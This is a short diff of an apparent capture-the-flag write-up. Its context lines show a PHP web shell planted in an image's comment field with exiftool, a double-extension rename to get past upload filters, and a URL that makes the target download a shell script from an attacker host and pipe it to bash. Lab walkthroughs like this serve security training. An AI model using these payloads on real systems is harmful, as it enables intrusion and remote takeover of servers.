@@ -53,7 +53,7 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
 mv file.jpg file.php.jpg
 ```
 ## Exploitation
-```console
+```url
 http://10.10.10.185/images/uploads/3.php.png?cmd=wget -O - http://10.10.16.5:1234/shell.sh | bash
 ```
  *don't forget to use burp to encode "wget -O - http://10.10.16.5:1234/shell.sh | bash"*
